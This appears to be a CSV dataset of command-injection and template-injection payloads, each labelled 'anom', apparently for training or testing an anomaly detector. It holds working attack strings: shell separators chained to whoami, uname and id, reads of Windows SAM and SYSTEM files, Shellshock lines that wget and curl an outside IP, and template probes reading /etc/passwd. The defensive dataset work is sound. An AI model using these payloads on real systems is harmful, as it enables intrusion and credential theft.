payload,label
| systeminfo,anom
; systeminfo,anom
& systeminfo,anom
&& systeminfo,anom
system('ls'),anom
system('pwd'),anom
system('pwd');,anom
|| system('sleep 5');,anom
| system('sleep 5');,anom
; system('sleep 5');,anom
& system('sleep 5');,anom
&& system('sleep 5');,anom
system('sleep 5'),anom
system('sleep 5');,anom
system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),anom
system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,anom
system('whoami'),anom
system('whoami');,anom
test*; ls -lhtR /var/www/,anom
"test* || perl -e 'print ""X""x16096'",anom
"test* | perl -e 'print ""X""x16096'",anom
"test* & perl -e 'print ""X""x16096'",anom
"test* && perl -e 'print ""X""x16096'",anom
"test*; perl -e 'print ""X""x16096'",anom
$(`type C:\boot.ini`),anom
&&type C:\\boot.ini,anom
| type C:\Windows\repair\SAM,anom
; type C:\Windows\repair\SAM,anom
& type C:\Windows\repair\SAM,anom
&& type C:\Windows\repair\SAM,anom
type C:\Windows\repair\SAM,anom
| type C:\Windows\repair\SYSTEM,anom
; type C:\Windows\repair\SYSTEM,anom
& type C:\Windows\repair\SYSTEM,anom
&& type C:\Windows\repair\SYSTEM,anom
type C:\Windows\repair\SYSTEM,anom
| type C:\WINNT\repair\SAM,anom
; type C:\WINNT\repair\SAM,anom
& type C:\WINNT\repair\SAM,anom
&& type C:\WINNT\repair\SAM,anom
type C:\WINNT\repair\SAM,anom
type C:\WINNT\repair\SYSTEM,anom
| type %SYSTEMROOT%\repair\SAM,anom
; type %SYSTEMROOT%\repair\SAM,anom
& type %SYSTEMROOT%\repair\SAM,anom
&& type %SYSTEMROOT%\repair\SAM,anom
type %SYSTEMROOT%\repair\SAM,anom
| type %SYSTEMROOT%\repair\SYSTEM,anom
; type %SYSTEMROOT%\repair\SYSTEM,anom
& type %SYSTEMROOT%\repair\SYSTEM,anom
&& type %SYSTEMROOT%\repair\SYSTEM,anom
type %SYSTEMROOT%\repair\SYSTEM,anom
uname,anom
;uname;,anom
| uname -a,anom
; uname -a,anom
& uname -a,anom
&& uname -a,anom
uname -a,anom
|/usr/bin/id,anom
;|/usr/bin/id|,anom
;/usr/bin/id|,anom
$;/usr/bin/id,anom
"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",anom
() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,anom
| wget http://crowdshield.com/.testing/rce.txt,anom
& wget http://crowdshield.com/.testing/rce.txt,anom
; wget https://crowdshield.com/.testing/rce_vuln.txt,anom
$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),anom
&& wget https://crowdshield.com/.testing/rce_vuln.txt,anom
wget https://crowdshield.com/.testing/rce_vuln.txt,anom
$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),anom
which curl,anom
which gcc,anom
which nc,anom
which netcat,anom
which perl,anom
which python,anom
which wget,anom
whoami,anom
| whoami,anom
; whoami,anom
' whoami,anom
' || whoami,anom
' & whoami,anom
' && whoami,anom
'; whoami,anom
" whoami
 || whoami",anom
" | whoami
 & whoami",anom
" && whoami
; whoami",anom
$(`whoami`),anom
& whoami,anom
&& whoami,anom
"{{ get_user_file(""C:\boot.ini"") }}",anom
"{{ get_user_file(""/etc/hosts"") }}",anom
"{{ get_user_file(""/etc/passwd"") }}",anom
{{4+4}},anom
{{4+8}},anom
{{person.secret}},anom
{{person.name}},anom
{1} + {1},anom
"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",anom
{{[] .__ Class __.__ base __.__ subclasses __ ()}},anom
